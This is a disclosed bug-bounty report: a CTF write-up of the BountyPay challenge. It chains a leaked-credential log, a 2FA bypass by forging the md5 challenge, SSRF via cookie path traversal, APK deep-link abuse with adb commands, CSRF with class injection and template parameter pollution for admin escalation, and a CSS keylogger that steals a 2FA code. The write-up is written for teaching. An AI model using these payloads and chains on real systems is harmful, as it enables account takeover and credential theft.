# [H1-2006 2020] From multiple vulnerabilities to complete ATO on any customer account and staff admin

## Report Details
- **Report ID**: 894863
- **URL**: https://hackerone.com/reports/894863
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-06-09T20:48:13.311Z
- **Disclosed**: 2020-06-22T16:23:59.827Z

## Reporter
- **Username**: rreiss
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
First of all, thanks for the awesome CTF. I enjoyed it very much :)

## Summary
The CTF was about helping HackerOne's beloved CEO, @martenmickos, to approve May bug bounty payments after he has lost his login details for BountyPay.

It all started with this tweet:
{F860982}

And as you all know, I had to help him since ~~ItTakesACrowd~~! Ohh sorry.. That's not our motto here, but **TogetherWeHitHarder** is! ;)

Let's start by saying that Marten can relax, I paid it all. I've sacrificed a few sleepless nights just for him to sleep well. 💙
{F859739}
Flag: `^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$`

In this report, I'll try to **focus more on my way of thinking**, rather than on the technical implementation so others will be able to learn what I've learned and use it to hit harder and make our world a safer place.

## CTF Walkthrough

## Recon
I've started the challenge by performing two basic recon steps:
  - Subdomain enumeration with [subfinder](https://github.com/projectdiscovery/subfinder) (`subfinder -d bountypay.h1ctf.com`).
This revealed the following subdomains:

```bash
app.bountypay.h1ctf.com
www.bountypay.h1ctf.com
bountypay.h1ctf.com
software.bountypay.h1ctf.com
staff.bountypay.h1ctf.com
api.bountypay.h1ctf.com
```

  - Directories/files enumeration with [ffuf](https://github.com/ffuf/ffuf) and [SecLists](https://github.com/danielmiessler/SecLists) which found a `.git/HEAD` file in app.bountypay.h1ctf.com.
  
```
ffuf -w ./SecLists/Discovery/Web-Content/common.txt -u "https://app.bountypay.h1ctf.com/FUZZ" -ac
```
{F859753}

In short, that means that we may be able to retrieve more information about the code in this application and maybe find some holes.
To retrieve more information about the Git configuration, I opened `https://app.bountypay.h1ctf.com/.git/config` in my browser and it downloaded the Git configuration file to my machine.
In the configuration file, there was the URL of the repository:
{F859755}
Once you enter the [Git repository on GitHub](https://github.com/bounty-pay-code/request-logger.git) you'll find a `logger.php` file with the following code:
{F859757}

I began to think about injection attacks, but it soon became irrelevant since I saw that the payload is being base64 encoded before saved to the log file and therefore I thought - maybe this log file exists in app.bountypay.h1ctf.com? The answer was yes.

## Finding Credentials

In the log file I was able to find base64 encoded strings:
```bash
$ curl https://app.bountypay.h1ctf.com/bp_web_trace.log
1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==
1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==
1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19
1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==
```

To make it easier to work with, I used the following Bash 1-liner which prints only the base64 **decoded** payload:
```bash
$ curl -s https://app.bountypay.h1ctf.com/bp_web_trace.log | awk -F ':' '{print $2}' | while read line; do echo "$line" | base64 --decode && echo "\n"; done
{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}

{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}

{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}

{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}
```

The next step was to actually try and log in with the exposed username and password `{"username":"brian.oliver","password":"V7h0inzX"}`, but it required me to do a 2-factor-authentication.

## 2FA Bypass

Due to the complexity of the code (10 characters, a-zA-Z0-9) I understood that brute-force isn't an option and I then had a look in the request in order to find a bypass.
These are the POST parameters from the request:
`username=brian.oliver&password=V7h0inzX&challenge=59e3c72d15b17b1b3cbd1c6ab0dc45ab&challenge_answer=My2faCode`
Looks like we need to find the `challenge_answer`, but wait.. What is `challenge`? That looks like an md5 hash.
1. Can we crack it? (nope.. that didn't work)
1. Can we understand what is `challenge` and why we need it in addition to `challenge_answer`?
The answer was that the application is checking if `md5(challenge_answer) equals challenge`, therefore I just placed `test` in challenge_answer  and `098f6bcd4621d373cade4e832627b4f6` in the challenge value and resubmitted the request and got a cookie!
{F859768}

## Finding the next door (SSRF via "Load Transactions" functionality)
Now that I was logged in as Brian I saw the BountyPay Dashboard with no transactions. Clicking the "Load Transactions" button triggered a request to `/statements?month=05&year=2020` and returned the following response body:
```
{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/F8gHiqSdpK\/statements?month=05&year=2020","data":"{\"description\":\"Transactions for 2020-05\",\"transactions\":[]}"}
```

If we will take a closer look at the cookie we received after we logged in (`eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9`), we will notice that this is a base64 encoded string, and this is how it looks after decode:
`{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}`

Hmm, interesting. The account_id exist both here in the encoded cookie and in the response from the load transactions request. What if we'll change our account_id to `../../` - that worked and the response contained our path traversal in the returned URL `"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/..\/..\/F8gHiqSdpK\/statements?month=05&year=2020"`.
The question was how we can use it as an SSRF on other subdomains and on which?
During the recon phase I also found out two more things that now come handy:
  1. https://software.bountypay.h1ctf.com/ returns a 401 Unauthorized error
  1. In https://api.bountypay.h1ctf.com/ there is a link to Google with an explanation on what is REST API, but the link isn't referring directly to Google, but to an internal `/redirect` endpoint (which have some kind of URLs whitelist)

By combining those two clues, I decided to enumerate files/directories in the software subdomain and was able to achieve it by chaining the SSRF vulnerability with the (semi-)open-redirect.
This is how the cookie value looks like `{"account_id":"../../redirect?url=https://software.bountypay.h1ctf.com","hash":"de235bffd23df6995ad4e0930baac1a2"}`.
In order to do the enumeration, I did the following flow:
  1. I created a simple Bash script that gets a url and generates the base64 encoded cookie value. {F859785}
  1. I created the payloads list and used ffuf for the enumeration:

```bash
cat ./SecLists/Discovery/Web-Content/common.txt | while read line; do ./soft-urls.sh "https://software.bountypay.h1ctf.com/${line}?"; done > fuzz-urls-encoded.txt

ffuf -w fuzz-urls-encoded.txt -u "https://app.bountypay.h1ctf.com/statements/?month=04&year=2020" -H "Cookie: token=FUZZ" -fw 5
```
 
One of the responses contained the following data which tells us that directory listing is enabled in `/uploads/` and that there is an APK file there.
```
<html>\n<head><title>Index of \/uploads\/<\/title><\/head>\n<body bgcolor=\"white\">\n<h1>Index of \/uploads\/<\/h1><hr><pre><a href=\"..\/\">..\/<\/a>\n<a href=\"\/uploads\/BountyPay.apk\">BountyPay.apk<\/a>                                        20-Apr-2020 11:26              4043701\n<\/pre><hr><\/body>\n<\/html>\n"}
```

I was then able to download the file from https://software.bountypay.h1ctf.com/uploads/BountyPay.apk.

## Android Application Reverse-Engineering Challenge
I started by installing the application on a local [Android Studio](https://developer.android.com/studio) emulator.

```bash
# Install an apk from the CLI
adb install BountyPay.apk
```
Then once I clicked the money bag button at the bottom of the app I saw the following notification:
{F860987}
Deep links? Hmm, okay! **Let's open up the code.**

In order to start reverse-engineering the application, I used multiple tools and techniques which will now be explained.
I used [Apktool](https://ibotpeaches.github.io/Apktool/) to unpack the APK file. Once the APK is unpacked we can investigate things like the manifest file and look for hard-coded strings.

After  I searched for hard-coded strings like URLs, tokens, and API keys without success, I moved on to investigating the deep-links.
This is how the deep-links definition looks like in the BountyPay app:

```java
        <activity android:label="@string/title_activity_congrats" android:name="bounty.pay.CongratsActivity" android:theme="@style/AppTheme.NoActionBar"/>
        <activity android:label="@string/title_activity_part_three" android:name="bounty.pay.PartThreeActivity" android:theme="@style/AppTheme.NoActionBar">
            <intent-filter android:label="">
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:host="part" android:scheme="three"/>
            </intent-filter>
        </activity>
        <activity android:label="@string/title_activity_part_two" android:name="bounty.pay.PartTwoActivity" android:theme="@style/AppTheme.NoActionBar">
            <intent-filter android:label="">
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:host="part" android:scheme="two"/>
            </intent-filter>
        </activity>
        <activity android:label="@string/title_activity_part_one" android:name="bounty.pay.PartOneActivity" android:theme="@style/AppTheme.NoActionBar">
            <intent-filter android:label="">
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:host="part" android:scheme="one"/>
            </intent-filter>
        </activity>
```

In short, we have three deep-link types:

```
one://part
two://part
three://part
```

Now its time to review to code and see what is on the other side of the deep links, which functionality they trigger.
I used [dex2jar](https://github.com/pxb1988/dex2jar) and [jd-gui](https://github.com/java-decompiler/jd-gui) to decompile the code and view it as java files.
The first deep link's functionality is placed at `PartOneActivity.java` and this is the relevant piece of code that reveals the full structure of the expected deep link:

```java
    if (getIntent() != null && getIntent().getData() != null) {
      String str = getIntent().getData().getQueryParameter("start");
      if (str != null && str.equals("PartTwoActivity") && sharedPreferences.contains("USERNAME")) {
        str = sharedPreferences.getString("USERNAME", "");
        SharedPreferences.Editor editor = sharedPreferences.edit();
        String str1 = sharedPreferences.getString("TWITTERHANDLE", "");
        editor.putString("PARTONE", "COMPLETE").apply();
        logFlagFound(str, str1);
        startActivity(new Intent((Context)this, PartTwoActivity.class));
      } 
    } 
```

**To trigger the first deep link I used `adb` from the CLI:**

```bash
adb shell am start -W -a android.intent.action.VIEW -d "one://part?start=PartTwoActivity" bounty.pay
```

The next mobile application challenges were pretty much the same but required some more advanced reverse engineering effort. I'll cover it briefly since it is pretty messy to write all the bits and bytes.

**Triggering the second deep link:**

```java
    if (getIntent() != null && getIntent().getData() != null) {
      Uri uri = getIntent().getData();
      String str1 = uri.getQueryParameter("two");
      String str2 = uri.getQueryParameter("switch");
      if (str1 != null && str1.equals("light") && str2 != null && str2.equals("on")) {
        editText.setVisibility(0);
        button.setVisibility(0);
        textView.setVisibility(0);
      } 
    } 
```

Trigger with `adb`:

```bash
adb shell am start -W -a android.intent.action.VIEW -d "two://part?two=light\&switch=on" bounty.pay
```

Now we get another screen with a text box and a hash below it.
{F861020}

We have two ways to crack it:
**Reverse engineer to understand the expected value**
  
  ```java
    public void submitInfo(View paramView) {
    final String post = ((EditText)findViewById(2131230834)).getText().toString();
    this.childRef.addListenerForSingleValueEvent(new ValueEventListener() {
          public void onCancelled(DatabaseError param1DatabaseError) {
            Log.e("PartTwoActivity", "onCancelled", (Throwable)param1DatabaseError.toException());
          }
          
          public void onDataChange(DataSnapshot param1DataSnapshot) {
            tring str1 = (String)param1DataSnapshot.getValue();
            SharedPreferences sharedPreferences = PartTwoActivity.this.getSharedPreferences("user_created", 0);
            SharedPreferences.Editor editor = sharedPreferences.edit();
            String str2 = post;
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.append("X-");
            stringBuilder.append(str1);
            if (str2.equals(stringBuilder.toString())) {
              str1 = sharedPreferences.getString("USERNAME", "");
              String str = sharedPreferences.getString("TWITTERHANDLE", "");
              PartTwoActivity.this.logFlagFound(str1, str);
              editor.putString("PARTTWO", "COMPLETE").apply();
              PartTwoActivity.this.correctHeader();
              return;
            } 
            Toast.makeText((Context)PartTwoActivity.this, "Try again! :D", 0).show();
          }
        });
  }
  ```
(This code piece is the main area, but to actually crack it you need other code pieces)

**The easy way - try to hack that md5 hash and get the expected value**
You will then enter`X-Token` in the text box and proceed to the third screen.

**Third screen**
In the third screen's code, there are code parts for Firebase connection, authentication, HTTP request and there are also a few log lines (`Log.i..`).
I started `logcat` on my machine so I'll be able to see the logs and triggered the last deep link that I've figured out from the code:

```bash
adb shell am start -W -a android.intent.action.VIEW -d "three://part?switch=b24\&three=UGFydFRocmVlQWN0aXZpdHk%3D\&header=X-Token" bounty.pay
```

💥💥💥💥💥💥💥 BOOM 💥💥💥💥💥💥💥
I now got a URL, a header, and a token to continue with.
{F861053}

## Privilege Escalation and Gaining a Staff User
I started enumerating files and directories once again in api.bountypay.h1ctf.com, but this time with the token and I found a new path - `https://api.bountypay.h1ctf.com/api/staff`(you may find the command I used in the references section at the bottom).

This path returns the staff members which is interesting, but I want more than that. I need to pay the hackers! I need to log in as a staff member.
That made me think about how can I create a staff user for myself. Hmm, what about trying to do a POST request with my own staff details.

I copied the staff member structure from the GET request, adjusted it to be sent as a x-www-form-urlencoded data and tried to send it with Brian's details:
```
name=Brian%20Oliver&staff_id=STF:KE624RQ2T9
```

That returned the following error:

```
HTTP/1.1 400 Bad Request
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 09 Jun 2020 18:29:09 GMT
Content-Type: application/json
Connection: close
Content-Length: 21

["Missing Parameter"]
```

I got stuck on that for a long time until I realized that I'm not sending the `Content-Type: application/x-www-form-urlencoded` header! Once I've added the header I got the following error: "Staff Member already has an account".

I played with the parameters a bit more, but that didn't work. I returned back to what I already know and got remembered of  [BountyPayHQ's Twitter](https://twitter.com/BountypayHQ) (BTW - BE AWARE OF FAKES! - https://twitter.com/BountypayH - WTF?@#%*$).
I didn't mention it, but I've found it at a very early stage of the CTF inside the HTML of the main domain.

{F861092}

There is obviously a clue here..
I had two questions - who is Sandra and who are they following?

I've found out that [Sandra](https://twitter.com/SandraA76708114) is a new employee, which is so excited about her new job that she took a picture of herself with her employee's badge:
{F861105}

Let's grab her staff_id and register with it. That worked and I got the following response:

```json
{"description":"Staff Member Account Created","username":"sandra.allison","password":"s%3D8qB8zEpMnc*xsz7Yp5"}
```

Now let's explore the staff web application and escalate further.

## Chaining CSRF + Content Injection(?) + Parameter Pollution to Privilege Escalation
I have to admit that this was **the best part of the challenge in my opinion**. I scratched my head here until I found the attack vector, but even then, it was complicated to actually perform the full exploitation.
This is a neat attack vector that combines multiple vulnerabilities and functionalities.

I'll go over the basic things I have discovered by testing the staff application and after that, I will connect the dots.
{F861113}
  - There are support tickets page and a specific ticket page, but nothing seems to be vulnerable to injections and there is no way to even place a message
  - We can edit the profile name and profile avatar
  - We can't inject bad things (SQLi, XSS, HTML, SSTI) in the profile name and the avatar, all special characters are removed, e.g. {}<>`"
  - The avatar's value is not being validated and is being printed to the DOM as a class. In a normal state, the `avatar` class, for example, will cause a specific background image to appear.
  {F861121}
  What we **can do** is to inject our own classes, but that's meaningless, right?
  - There is a report to admin functionality that sends a relative URL (in base64) to the admin for them to investigate a page. I couldn't find any SSRF vulnerabilities or other injections.
   {F861136}
  - The page is using a custom JavaScript file - `/js/website.js` with the following content

**Examine the JS File**
```javascript
$('.upgradeToAdmin').click(function () {
  let t = $('input[name="username"]').val();
  $.get('/admin/upgrade?username=' + t, function () {
    alert('User Upgraded to Admin')
  })
}),
$('.tab').click(function () {
  return $('.tab').removeClass('active'),
  $(this).addClass('active'),
  $('div.content').addClass('hidden'),
  $('div.content-' + $(this).attr('data-target')).removeClass('hidden'),
  !1
}),
$('.sendReport').click(function () {
  $.get('/admin/report?url=' + url, function () {
    alert('Report sent to admin team')
  }),
  $('#myModal').modal('hide')
}),
document.location.hash.length > 0 && ('#tab1' === document.location.hash && $('.tab1').trigger('click'), '#tab2' === document.location.hash && $('.tab2').trigger('click'), '#tab3' === document.location.hash && $('.tab3').trigger('click'), '#tab4' === document.location.hash && $('.tab4').trigger('click'));
``` 

The first thing that pops is the admin upgrade request `$.get('/admin/upgrade?username=' + t`.
I tried to open it in my browser, but it returned an error that only admins can perform the upgrade. I also tried to use the X-Token that we found in the mobile application, but that didn't work as well.
I also tried some other things like sending it with Sandra's username in the report to admin, but nope... Nothing happened.
So, we definitely have a CSRF issue that can work with some social engineering attack, but that's not the case here. We need a **fully working exploitation**!

Let's **continue investigating the JS file and draw an attack vector**.
We can see that the upgrade to admin request is triggered by a click on an element with the class `upgradeToAdmin`.
Does that ring a bell? We can control the classes of the avatar!

Now once I click my avatar a request is being triggered:
{F861144}

But, we still have two problems that we need to solve:
  1. Clicking my profile picture is great, but not feasible in a CTF - we need to make it trigger the request automatically
  1. The request needs a username, but the username is taken from `input[name="username"]` which doesn't exist on any of the pages, except for the login page, but on the login page we don't have this JS file :S

Let's take it to step by step...
**Make the request trigger automatically on page load**
Let's focus on the following JS code:

```javascript
document.location.hash.length > 0 && ('#tab1' === document.location.hash && $('.tab1').trigger('click'), '#tab2' === document.location.hash && $('.tab2').trigger('click'), '#tab3' === document.location.hash && $('.tab3').trigger('click'), '#tab4' === document.location.hash && $('.tab4').trigger('click'));
```

When the location hash contains #tab[1-4], that triggers a click on the equivalent class, for example, when I open https://staff.bountypay.h1ctf.com/?template=home#tab3 it will trigger a click on all elements with the class `tab3`. This was made so a user will be able to open a specific tab directly by a given URL. A pretty common use case actually.

Do I have to remind you that **we can control the classes of the profile picture**?
I then updated my profile_avatar with the following value - `avatar2 upgradeToAdmin tab2` and once I entered https://staff.bountypay.h1ctf.com/?template=home#tab2 that triggered the `/admin/upgrade` request automatically.

**Passing the username in the request**
I tried to submit the URL https://staff.bountypay.h1ctf.com/?template=home#tab2 in different variations for a while, hoping that when the admin will see Sandra's ticket, for example, they will have an input with Sandra's username in the page and that it will work, but it didn't.
I also tried to pass `&username=sandra.allison` in the URL and other things as well without any success.

Let's once again take a step back and think of what we already know.
We know that the only place where we have a username field is the login page, but how can I make it appear here as well?

By taking another look in the URL we can see that it has a template parameter. Actually, I even tested it for LFI at the very beginning...
The URL: https://staff.bountypay.h1ctf.com/?template=home

What if we could load more than one template?? I tried to use parameter pollution like that:
`https://staff.bountypay.h1ctf.com/?template=home&template=login`
But that didn't work. I then thought to give it another try and do it like that:
`https://staff.bountypay.h1ctf.com/?template[]=home&template[]=login`

That worked!
{F861172}

Another minor thing, we also need to place the `&username=sandra.allison` in the URL so it will be placed in the username field when loading the template.

**Putting it all together**
  - Make sure we placed the classes (`upgradeToAdmin tab2`) in our profile_avatar
  - Write our final payload:
  `/?template[]=login&template[]=ticket&ticket_id=3582&username=sandra.allison#tab2`
  - Make a report request with the base64 encoded payload:  
  `GET /admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uI3RhYjI= HTTP/1.1`

We got a new cookie!
{F861179}

With the new cookie, Sandra is now an admin and we have a new tab in our staff application:
{F861181}

## Another 2FA Bypass via SSRF and CSS Keylogger
Once we log in as marten.mickos (we will have to bypass the same old 2FA as we did with Brian at the beginning), we will be able to finally see the transaction that we need to pay:
{F861194}

Once we click the Pay button we will get another 2FA verification:
{F861205}
And once we'll click the send challenge button the following request will be made:

```
POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
Host: app.bountypay.h1ctf.com
...

app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css
```

Interesting, right?
Let's see what's inside the CSS file.

```css
/**
Template for the UNI 2FA App
 */

body {
    background-color: #FFFFFF;
}

div.branding {
    height:80px;
    width:80px;
    margin:20px auto 40px auto;
    background-image:url("https://www.bountypay.h1ctf.com/images/bountypay.png");
    background-position:center center;
    background-repeat: no-repeat;
    background-size: cover;
}
```

"Template for the UNI 2FA App"? App what? App who?

I checked if this is actually vulnerable to SSRF and the answer was **yes**. I got the requests on my Burp Collaborator from Headless Chrome.
I played with that a bit and got to conculsion that the response from my server is not reflected any where and therefore we have a **blind SSRF**.

Let's go by the book. When trying to exploit a blind SSRF there are two main things we can do:
  - Port Scanning - couldn't find open ports (by response size and response time)
  - Gopher protocol - didn't even try it, no chance that this will be the final step in the CTF

It was 2am and I decided to take a nap until my children will wake me up again in ~4 hours.
At the next morning, when drinking my coffee, I had a crazy idea... I was thinking "well, this CSS is being used in the 2FA client app, why won't we try a CSS keylogger, even if it won't work - it's always cool to use it!"

I placed a CSS keylogger on my server and sent the code once again with the `app_style` parameter pointing to my CSS keylogger.
{F861238}

It worked! I got requests with the characters.
I tried to enter the characters in the same order it arrived, but that didn't work. That makes sense, because the victim's browser makes the requests almost in parallel and therefore the order isn't correct.
I started to create a list of all the ppossibilities from the given characters in order to brute-force it, but then I had a much better idea.

That leads me to **the final keylogger**:
I understood that the application contains multiple inputs and each one contains one character. All I need to do is to get the characters in the right order. Can I do it in CSS? Sure I can!
I used the `nth-child(x)` selector and appended `-[child-number]` to the logged character.

This is how it appeared on my server:
{F861287}

I was then able to complete the challenge and get the flag.

Hope you enjoyed reading my write-up! If so, click the up arrow at the top :D
Feel free to follow me on Twitter as well :)

## Supporting Material/References
  - More about Android deep-links - https://developer.android.com/training/app-links/deep-linking
  - Fuzzing the API subdomain with the X-Token 
  ```bash
  ffuf -u "https://api.bountypay.h1ctf.com/api/FUZZ" -H "X-Token: 8e9998ee3137ca9ade8f372739f062c1" -w ./SecLists/Discovery/Web- 
  Content/common.txt.
  ```
  - The final CSS Keylogger I used - {F861290}

## Impact

There are a few critical impacts besides the technical ones:
- The main impact is that I didn't sleep enough since you released the CTF
- Positive impact due to new things I learned
- Positive impact on the Hackers community that will read this and other write-ups on the challenge
- I'm returning to my programs with more motivation which will do good for the world and for HackerOne's revenue 😂

## Attachments
- Screen_Shot_2020-06-09_at_0.44.37.png
- Screen_Shot_2020-06-09_at_1.02.09.png
- Screen_Shot_2020-06-09_at_1.06.54.png
- Screen_Shot_2020-06-09_at_1.08.56.png
- Screen_Shot_2020-06-09_at_1.32.40.png
- soft-urls.sh
- Screen_Shot_2020-06-09_at_19.45.43.png
- Screen_Shot_2020-06-09_at_19.52.23.png
- Screen_Shot_2020-06-09_at_20.27.33.png
- Screen_Shot_2020-06-09_at_21.07.46.png
- Screen_Shot_2020-06-09_at_21.37.48.png
- EXfGdchWoAAtVO0.jpg
- Screen_Shot_2020-06-09_at_21.49.33.png
- Screen_Shot_2020-06-09_at_22.03.57.png
- Screen_Shot_2020-06-09_at_22.14.00.png
- Screen_Shot_2020-06-09_at_22.27.55.png
- Screen_Shot_2020-06-09_at_22.45.17.png
- Screen_Shot_2020-06-09_at_22.52.48.png
- Screen_Shot_2020-06-09_at_22.54.34.png
- Screen_Shot_2020-06-09_at_22.58.40.png
- Screen_Shot_2020-06-09_at_23.01.18.png
- giphy.webp
- Screen_Shot_2020-06-09_at_23.22.38.png
- keylogger-final.png
- keylogger.css
